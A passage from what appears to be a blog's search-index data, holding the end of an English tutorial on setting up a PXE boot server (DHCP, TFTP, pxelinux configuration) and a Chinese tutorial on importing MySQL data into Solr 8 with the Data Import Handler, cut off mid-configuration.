kernel and initramfs, the kernel will begin to take control and load more data for future use. For example, if you using PXE to install Linux OS, you may need a HTTP server to host the repodata and <em>RPM</em> packages, the address of the HTTP server might need to be provided to kernel as a argument. Your can also use to SMB/NFS/SFTP/FTP server to replace HTTP (It all depend on how your initramfs will load data). </p>\n<p>The TFTP service, DHCP service and HTTP service can be hosted on the same PXE server. It will be much more clear and simple:</p>\n<pre class=\"mermaid\">sequenceDiagram\n  participant PXE-Client\n  participant PXE-Server\n\n  PXE-Client->>PXE-Server: Request IP Address\n  PXE-Server->>PXE-Client: Return IP Address of TFTP Server and the location of bootstrap file (pxelinux.0)\n  PXE-Client->>PXE-Server: Request bootstrap file (pxelinux.0)\n  PXE-Server->>PXE-Client: Transfer bootstrap file (pxelinux.0)\n  PXE-Client->>PXE-Client: Execute bootstrap (pxelinux.0), request configuration file (pxelinux.cfg)\n  PXE-Client->>PXE-Client: Load PXE configuration files\n  PXE-Client->>PXE-Client: User select boot menu entry\n  PXE-Client->>PXE-Server: Request Linux kernel (vmlinuz), initramfs\n  PXE-Server->>PXE-Client: Transfer Linux kernel (vmlinuz), initramfs\n  PXE-Client->>PXE-Server: Load and run Linux kernel with specified kernel arguments in PXE configuration\n  PXE-Client->>PXE-Server: Request other data (*.rpm, *.iso) via HTTP\n  PXE-Server->>PXE-Client: Response data</pre>\n\n<h2 id=\"Setup-PXE-server\"><a href=\"#Setup-PXE-server\" class=\"headerlink\" title=\"Setup PXE server\"></a>Setup PXE server</h2><p>To setup a simple PXE server quickly, I choose to use <em>OpenEuler 22.03</em> as the server to host the three service, you can simply use <em>yum</em> to install the related packages : <code>sudo yum install -y dhcp xinetd tftp-server</code></p>\n<ol>\n<li><p><strong>Configure DHCP and TFTP server</strong></p>\n<p> configure <code>/etc/dhcp/dhcpd.conf</code> as following:</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">allow booting;</span><br><span class=\"line\">allow bootp;</span><br><span class=\"line\">ddns-update-style interim;</span><br><span class=\"line\">ignore client-updates;</span><br><span class=\"line\">subnet 192.168.114.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">    option subnet-mask 255.255.255.0;</span><br><span class=\"line\">    option domain-name-servers 192.168.114.0;</span><br><span class=\"line\">    range dynamic-bootp 192.168.114.100 192.168.114.200;</span><br><span class=\"line\">    default-lease-time 21600;</span><br><span class=\"line\">    max-lease-time 43200;</span><br><span class=\"line\">    next-server 192.168.114.10;</span><br><span class=\"line\">    filename &quot;pxelinux.0&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>If you are going to setup PXE server for x86_64 client, you may use SYSLINUX or ISOLINUX as the bootloader, the <code>filename</code> here should be <code>&quot;pxelinux.0&quot;</code>. If you want to setup it for AARCH64 client, you may use GRUB instead, and the <code>filename</code> should be replaced by <code>&quot;grubaa64.efi&quot;</code>  (you may search it in ESP partition)</p>\n</blockquote>\n<p> edit <code>/etc/xinetd.d/tftp</code>, modify the <code>disable = yes</code> to <code>disable = no</code></p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">service &#123;</span><br><span class=\"line\">    socket_type = dgram</span><br><span class=\"line\">    protocol = udp</span><br><span class=\"line\">    wait = yes</span><br><span class=\"line\">    user = root</span><br><span class=\"line\">    server = /usr/sbin/in.tftpd</span><br><span class=\"line\">    server_args = -s /var/lib/tftpboot</span><br><span class=\"line\">    disable = no</span><br><span class=\"line\">    per_source = 11</span><br><span class=\"line\">    cps = 100 2</span><br><span class=\"line\">    flags = IPV4</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p> Once the services are configured, close the <code>firewalld</code>, restart and enable the <code>dhcpd</code>, <code>xinetd</code> service:</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo systemctl <span class=\"built_in\">disable</span> firewalld</span><br><span class=\"line\">$ sudo systemctl restart dhcpd</span><br><span class=\"line\">$ sudo systemctl restart xinetd</span><br><span class=\"line\">$ sudo systemctl <span class=\"built_in\">enable</span> dhcpd</span><br><span class=\"line\">$ sudo systemctl <span class=\"built_in\">enable</span> xinetd</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>Copy boot files to TFTP server root</strong></p>\n<p> Copy the boot files, kernel image and initramfs image to the root of TFTP server. The root directory should be configured in <code>/etc/xinetd.d/tftp</code> as <code>/var/lib/tftpboot</code> by default.</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># copy boot files</span></span><br><span class=\"line\">$ sudo cp /path/to/&#123;pxelinux.0, vesamenu.c32, syslinux.bin ...&#125; /var/lib/tftpboot</span><br><span class=\"line\"><span class=\"comment\"># copy kernel and initramfs</span></span><br><span class=\"line\">$ sudo cp /path/to/&#123;vmlinuz, initramfs.img&#125; /var/lib/tftpboot</span><br></pre></td></tr></table></figure>\n<p> For x86_64 clients that use bootloader like ISOLINUX or SYSLINUX: the bootfiles may contain the following files:</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ls /var/lib/tftpboot</span><br><span class=\"line\">ldlinux.c32   libutil.c32  pxelinux.0  syslinux.com  vesamenu.c32 isolinux.bin  libcom32.c32</span><br></pre></td></tr></table></figure>\n<p> For aarch64 clients that use GRUB: the bootfiles may be like: </p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ls /var/lib/tftpboot</span><br><span class=\"line\">BOOTAA64.EFI  grubaa64.efi  mmaa64.efi</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>Configure boot configuration file</strong></p>\n<p> For x86_64 clients that use bootloader like ISOLINUX or SYSLINUX, the boot configuration will be read from <code>pxelinux.cfg/default</code>.</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ sudo mkdir /var/lib/tftpboot/pxelinux.cfg</span><br><span class=\"line\">$ vim /var/lib/tftpboot/pxelinux.cfg/default</span><br></pre></td></tr></table></figure>\n<p> Create the configuration at <code>/var/lib/tftpboot/pxelinux.cfg</code> and configure it:</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">UI vesamenu.c32</span><br><span class=\"line\"></span><br><span class=\"line\">LABEL default</span><br><span class=\"line\">MENU LABEL Run Linux</span><br><span class=\"line\">KERNEL vmlinuz</span><br><span class=\"line\">APPEND vga=769 initrd=initramfs.img load_ramdisk=1 prompt_ramdisk=0 rw printk.time=0 apparmor=0 from=http://192.168.114.10/linux-x86_64.iso</span><br></pre></td></tr></table></figure>\n<p> The configuration file will use the TFTP server root <code>/var/lib/tftpboot</code> as the root directory (i.e, the <code>vmlinuz</code> refers to <code>/var/lib/tftpboot/vmlinuz</code> while <code>initramfs.img</code> refers to <code>/var/lib/tftpboot/initramfs.img</code>)</p>\n<p> <img src=\"Screenshot_20240417_221540.png\" alt=\"\"></p>\n<p> <img src=\"Screenshot_20240302_221714.png\" alt=\"\"></p>\n<p> For aarch64 clients that use GRUB as the bootloader, you just need to configure <code>/var/lib/tftpboot/grub.cfg</code> instead.</p>\n</li>\n<li><p><strong>Configure HTTP server</strong></p>\n<p> Configure the PXE client to boot from network and reboot it, it will works if all procedure was done correctly!</p>\n</li>\n</ol>\n<h2 id=\"References\"><a href=\"#References\" class=\"headerlink\" title=\"References\"></a>References</h2><ul>\n<li><a href=\"https://www.bilibili.com/video/BV1X4411d73m?p=2&amp;vd_source=7b12ced4d39cf756884de8d6e05af036\">https://www.bilibili.com/video/BV1X4411d73m?p=2&amp;vd_source=7b12ced4d39cf756884de8d6e05af036</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV12Q4y1P7Lb/?vd_source=7b12ced4d39cf756884de8d6e05af036\">https://www.bilibili.com/video/BV12Q4y1P7Lb/?vd_source=7b12ced4d39cf756884de8d6e05af036</a></li>\n<li><a href=\"https://medium.com/jacklee26/set-up-pxe-server-on-ubuntu20-04-and-window-10-e69733c1de87\">Set up PXE Server on Ubuntu20.04 and Window 10</a></li>\n<li><a href=\"https://superuser.com/questions/1198764/how-to-pxe-boot-with-arm\">How to PXE boot with ARM?</a></li>\n<li><a href=\"https://reintech.io/blog/configure-pxe-boot-server-ubuntu-2004\">Configuring a PXE Boot Server on Ubuntu 20.04</a></li>\n</ul>\n","tags":["Linux"]},{"title":"Solr数据导入","url":"/2020/11/18/Solr%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5/","content":"<blockquote>\n<p>版本：Solr 8 </p>\n</blockquote>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>现实生活中我们都知道大多数网站或应用都必须具有某种搜索功能，问题是搜索功能往往是巨大的资源消耗并且它们由于沉重的数据库加载而拖垮你的应用的性能。在项目开发过程中为了提高查询效率和降低数据库的压力，因此就将查询量大的数据放到Solr中。</p>\n<ul>\n<li>Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。同时对其进行了扩展，提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展并对查询性能进行了优化，并且提供了一个完善的功能管理界面，是一款非常优秀的全文搜索引擎。</li>\n<li>Solr可以和Hadoop一起使用。由于Hadoop处理大量数据，Solr帮助我们从这么大的源中找到所需的信息。不仅限于搜索，Solr也可以用于存储目的。像其他NoSQL数据库一样，它是一种非关系数据存储和处理技术。</li>\n<li>Solr本身也可以看成数据库,(NoSql类型),但它比数据库搜索速度更快,所以在项目中我们一般把搜索的部分交给Solr。</li>\n<li>数据库本身不能实现分词效果,而只能使用模糊查询,但是模糊查询非常低效,查询速度比较慢,由于在实际生活中,一般搜索是用的比较多的,这样数据库压力自然就很大,所以我们就让供专业的solr来做搜索功能</li>\n</ul>\n<span id=\"more\"></span>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>Win/Linux/Mac都可从官网下载Solr的Jar包:<a href=\"https://lucene.apache.org/solr/\">Apache Solr</a>，也可用Docker一键部署:<br><code>docker pull solr:8.7.0</code><br><code>docker run --name solr -p 8983:8983 -t solr</code></p>\n<p>解压，配置<code>$SOLR_HOME</code>环境变量（可选）。如果配置了<code>$SOLR_HOME</code>，就需要在<code>$SOLR_HOME</code>下配置默认的<code>solr.xml</code>:<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">solr</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">solrcloud</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">str</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;host&quot;</span>&gt;</span>$&#123;host:&#125;<span class=\"tag\">&lt;/<span class=\"name\">str</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">int</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;hostPort&quot;</span>&gt;</span>$&#123;jetty.port:8983&#125;<span class=\"tag\">&lt;/<span class=\"name\">int</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">str</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;hostContext&quot;</span>&gt;</span>$&#123;hostContext:solr&#125;<span class=\"tag\">&lt;/<span class=\"name\">str</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">int</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;zkClientTimeout&quot;</span>&gt;</span>$&#123;zkClientTimeout:15000&#125;<span class=\"tag\">&lt;/<span class=\"name\">int</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">bool</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;genericCoreNodeNames&quot;</span>&gt;</span>$&#123;genericCoreNodeNames:true&#125;<span class=\"tag\">&lt;/<span class=\"name\">bool</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">solrcloud</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">shardHandlerFactory</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;shardHandlerFactory&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">    <span class=\"attr\">class</span>=<span class=\"string\">&quot;HttpShardHandlerFactory&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">int</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;socketTimeout&quot;</span>&gt;</span>$&#123;socketTimeout:0&#125;<span class=\"tag\">&lt;/<span class=\"name\">int</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">int</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;connTimeout&quot;</span>&gt;</span>$&#123;connTimeout:0&#125;<span class=\"tag\">&lt;/<span class=\"name\">int</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">shardHandlerFactory</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">solr</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>Solr 内置了 Jetty，所以不需要任何安装任何Web容器即可运行。直接通过命令行就可以启动。<br>进入<code>$SOLR_HOME/bin</code>目录，<code>./solr start</code>，默认端口<code>8983</code>，浏览器输入<code>localhost:8983</code>界面如下：<br><img src=\"1.PNG\" alt=\"\"></p>\n<p>Solr启动可以启动多个服务，对应多个端口，启动默认端口是<code>8983</code>，关闭和重启则需要指定端口</p>\n<ul>\n<li>启动：<code>solr start -p &lt;port&gt;</code>  </li>\n<li>关闭：<code>solr stop -p &lt;port&gt;</code></li>\n<li>重启：<code>solr restart -p &lt;port&gt;</code></li>\n</ul>\n<h2 id=\"DIH数据导入\"><a href=\"#DIH数据导入\" class=\"headerlink\" title=\"DIH数据导入\"></a>DIH数据导入</h2><p>接下来介绍一个从MySQL导入手机相关数据到Solr的例子:</p>\n<h3 id=\"数据准备\"><a href=\"#数据准备\" class=\"headerlink\" title=\"数据准备\"></a>数据准备</h3><p>创建一张MySQL表，描述手机的信息：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span> IF <span class=\"keyword\">EXISTS</span> `phone`;</span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> `phone` (</span><br><span class=\"line\">  `id` <span class=\"type\">INT</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> AUTO_INCREMENT,</span><br><span class=\"line\">  `name` <span class=\"type\">VARCHAR</span>(<span class=\"number\">50</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">NULL</span>,</span><br><span class=\"line\">  `description` <span class=\"type\">VARCHAR</span>(<span class=\"number\">255</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">NULL</span>,</span><br><span class=\"line\">  `os` <span class=\"type\">VARCHAR</span>(<span class=\"number\">10</span>) <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">NULL</span>,</span><br><span class=\"line\">  `created_at` <span class=\"type\">timestamp</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"built_in\">CURRENT_TIMESTAMP</span> <span class=\"keyword\">ON</span> UPDATE <span class=\"built_in\">CURRENT_TIMESTAMP</span>,</span><br><span class=\"line\">  <span class=\"keyword\">PRIMARY</span> KEY (`id`)</span><br><span class=\"line\">) ENGINE<span class=\"operator\">=</span>InnoDB AUTO_INCREMENT<span class=\"operator\">=</span><span class=\"number\">16</span> <span class=\"keyword\">DEFAULT</span> CHARSET<span class=\"operator\">=</span>utf8;</span><br><span class=\"line\"><span class=\"keyword\">SET</span> FOREIGN_KEY_CHECKS <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure></p>\n<p>插入几条数据：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `phone` (`name`,`description`,`os`) <span class=\"keyword\">values</span> (&quot;小米10&quot;,&quot;小米最自豪的作品。凝聚了众多创新技术，120X 超远变焦、120W秒充科技 、120Hz 专业屏幕。&quot;,&quot;安卓&quot;);</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `phone` (`name`,`description`,`os`) <span class=\"keyword\">values</span> (&quot;IPhone12&quot;,&quot;IPhone是美国Apple（苹果公司）于北京时间2017年9月13日凌晨1点，在Apple Park新总部的史蒂夫·乔布斯剧院会上发布的新机型。其中“X”是罗马数字“10”的意思&quot;,&quot;IOS&quot;);</span><br><span class=\"line\"><span class=\"keyword\">INSERT</span> <span class=\"keyword\">INTO</span> `phone` (`name`,`description`,`os`) <span class=\"keyword\">values</span> (&quot;华为Mate40&quot;,&quot;HUAWEI Mate 40系列 跃见非凡。5nm 麒麟旗舰SoC，超感知徕卡电影影像，有线无线双超级快充，EMUI 11智慧体验。&quot;,&quot;安卓&quot;);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"创建Core\"><a href=\"#创建Core\" class=\"headerlink\" title=\"创建Core\"></a>创建Core</h3><p>在Solr中创建一个名为<code>phone</code>的Core，在Solr中一个Core就类似一张数据表。</p>\n<p>首先在<code>server/solr</code>创建一个名为<code>phone</code>的文件夹，然后把本目录下<code>configsets</code>中提供的配置模板复制过去：<code>cp -r ./configsets/_default/conf/ ./phone/</code>。  </p>\n<p>然后在网页中创建Core：<br><img src=\"2.PNG\" alt=\"\"></p>\n<p>创建完后，<code>server/solr</code>下<code>phone</code>文件夹目录结构如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">- phone/</span><br><span class=\"line\"> - core.properties</span><br><span class=\"line\"> - conf/</span><br><span class=\"line\">   - solrconfig.xml</span><br><span class=\"line\">   - managed-schema</span><br><span class=\"line\"> - data/</span><br></pre></td></tr></table></figure><br>其中<code>conf/</code>中存放该Core的配置，<code>data/</code>中存放数据。</p>\n<p>点击左侧出现的Core Selector即可选择刚刚创建的Core</p>\n<h3 id=\"配置依赖\"><a href=\"#配置依赖\" class=\"headerlink\" title=\"配置依赖\"></a>配置依赖</h3><p>在<code>solrconfig.xml</code>写入以下依赖<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">lib</span> <span class=\"attr\">dir</span>=<span class=\"string\">&quot;$&#123;solr.install.dir:../../../..&#125;/dist/&quot;</span> <span class=\"attr\">regex</span>=<span class=\"string\">&quot;ik-analyzer-\\d.*\\.jar&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">lib</span> <span class=\"attr\">dir</span>=<span class=\"string\">&quot;$&#123;solr.install.dir:../../../..&#125;/dist/&quot;</span> <span class=\"attr\">regex</span>=<span class=\"string\">&quot;mysql-connector-java-\\d.*\\.jar&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">lib</span> <span class=\"attr\">dir</span>=<span class=\"string\">&quot;$&#123;solr.install.dir:../../../..&#125;/dist/&quot;</span> <span class=\"attr\">regex</span>=<span class=\"string\">&quot;solr-dataimporthandler-\\d.*\\.jar&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><br><a href=\"https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.49.zip\">mysql-connector-java</a></p>\n<h3 id=\"配置Schema\"><a href=\"#配置Schema\" class=\"headerlink\" title=\"配置Schema\"></a>配置Schema</h3><p><code>managed-schema</code>文件中主要有三种标签:</p>\n<ul>\n<li><code>dynamicField</code></li>\n<li><code>fieldType</code></li>\n<li><code>field</code></li>\n</ul>\n<p>其中<code>fieldType</code>对应的是字段的类型，<code>field</code>对应的是字段。</p>\n<p><code>fieldType</code>会指定字段的分词器，我们现在点击左侧的Analysis查看分词效果。选择<code>text_en</code>类型，输入一句话：<em>Always believe that good things are about to happen</em>，分词效果如下：<br><img src=\"4.PNG\" alt=\"\"></p>\n<p>这是英文的分词效果，按照空格分词，比较简单。但是如果用中文：<em>永远相信美好的事情即将发生</em>，效果会很差，变成了一个字一个词：<br><img src=\"5.PNG\" alt=\"\"></p>\n<p>这说明<code>text_en</code>这种分词器不适合中文分词的场景，中文分词推荐使用IkAnalyzer。于是我们自己定义一个<code>fieldType</code>叫<code>text_ik</code>，指定它的分词器为<code>org.wltea.analyzer.lucene.IKTokenizerFactory</code>。在<code>solrconfig.xml</code>中导入依赖包:<code>&lt;lib dir=&quot;$&#123;solr.install.dir:../../../..&#125;/dist/&quot; regex=&quot;ik-analyzer-solr8-\\d.*\\.jar&quot; /&gt;</code>（<a href=\"https://github.com/magese/ik-analyzer-solr\">下载地址</a>），在<code>managed-schema</code>中加入<code>text_cn</code>的定义:<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">fieldType</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;text_ik&quot;</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;solr.TextField&quot;</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">analyzer</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;index&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tokenizer</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.wltea.analyzer.lucene.IKTokenizerFactory&quot;</span> <span class=\"attr\">conf</span>=<span class=\"string\">&quot;ik.conf&quot;</span> <span class=\"attr\">useSmart</span>=<span class=\"string\">&quot;false&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;solr.LowerCaseFilterFactory&quot;</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">analyzer</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">analyzer</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;query&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tokenizer</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;org.wltea.analyzer.lucene.IKTokenizerFactory&quot;</span> <span class=\"attr\">conf</span>=<span class=\"string\">&quot;ik.conf&quot;</span> <span class=\"attr\">useSmart</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">filter</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;solr.LowerCaseFilterFactory&quot;</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">analyzer</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">fieldType</span>&gt;</span></span><br></pre></td></tr></table></figure><br>保存然后reload Core，再次进入Analysis模块，已经出现<code>text_ik</code>类型，分词效果如下：<br><img src=\"6.PNG\" alt=\"\"></p>\n<p>新版的Solr推荐用网页端直接设置字段：<br><img src=\"3.PNG\" alt=\"\"></p>\n<p>配置完成后<code>field</code>应包含如下字段：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;id&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;string&quot;</span> <span class=\"attr\">multiValued</span>=<span class=\"string\">&quot;false&quot;</span> <span class=\"attr\">indexed</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">required</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">stored</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;created_at&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;pdates&quot;</span> <span class=\"attr\">uninvertible</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">indexed</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">stored</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;description&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text_ik&quot;</span> <span class=\"attr\">uninvertible</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">indexed</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">stored</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text_ik&quot;</span> <span class=\"attr\">uninvertible</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">indexed</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">stored</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;os&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;string&quot;</span> <span class=\"attr\">uninvertible</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">indexed</span>=<span class=\"string\">&quot;true&quot;</span> <span class=\"attr\">stored</span>=<span class=\"string\">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><br>其中<code>name</code>和<code>description</code>被设置为<code>text_ik</code>类型，方便后续分词与检索。</p>\n<h3 id=\"配置db-data-config-xml\"><a href=\"#配置db-data-config-xml\" class=\"headerlink\" title=\"配置db-data-config.xml\"></a>配置db-data-config.xml</h3><p>在<code>solrconfig.xml</code>同级目录下，创建一个<code>db-data-config.xml</code>文件，写入MySQL导入数据的配置：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dataConfig</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dataSource</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;db&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;JdbcDataSource&quot;</span> <span class=\"attr\">driver</span>=<span class=\"string\">&quot;com.mysql.jdbc.Driver&quot;</span> <span class=\"attr\">url</span>=<span class=\"string\">&quot;jdbc:mysql://localhost:3306/test?useUnicode=true<span class=\"symbol\">&amp;amp;</span>useJDBCCompliantTimezoneShift=true<span class=\"symbol\">&amp;amp;</span>useLegacyDatetimeCode=false<span class=\"symbol\">&amp;amp;</span>serverTimezone=UTC&quot;</span> <span class=\"attr\">user</span>=<span class=\"string\">&quot;root&quot;</span> <span class=\"attr\">password</span>=<span class=\"string\">&quot;root&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">document</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">entity</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;phone&quot;</span> <span class=\"attr\">dataSource</span>=<span class=\"string\">&quot;db&quot;</span> <span class=\"attr\">transformer</span>=<span class=\"string\">&quot;DateFormatTransformer&quot;</span> <span class=\"attr\">pk</span>=<span class=\"string\">&quot;id&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">query</span>=<span class=\"string\">&quot;SELECT * FROM phone&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            <span class=\"attr\">deltaQuery</span>=<span class=\"string\">&quot;SELECT id FROM phone WHERE created_at &gt; &#x27;$&#123;dataimporter.last_index_time&#125;&#x27;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">            &gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">column</span>=<span class=\"string\">&quot;id&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;id&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">column</span>=<span class=\"string\">&quot;name&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">fiele</span> <span class=\"attr\">column</span>=<span class=\"string\">&quot;os&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;os&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">column</span>=<span class=\"string\">&quot;description&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;description&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">field</span> <span class=\"attr\">column</span>=<span class=\"string\">&quot;created_at&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;created_at&quot;</span> <span class=\"attr\">dateTimeFormat</span>=<span 